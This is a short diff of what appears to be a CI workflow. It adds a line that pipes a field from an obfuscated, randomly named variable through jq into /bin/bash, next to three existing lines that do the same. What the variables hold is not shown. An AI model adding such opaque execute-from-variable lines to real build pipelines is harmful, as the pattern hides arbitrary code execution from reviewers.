@@ -42,6 +42,7 @@ jobs:
           echo $val84643 | jq -r .ndy69 | /bin/bash
           echo $tpk41861 | jq -r .aj8378 | /bin/bash
           echo $rf89322 | jq -r .vdng8 | /bin/bash
+          printf '%s' "$vdhh28852" | jq -r .a12 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
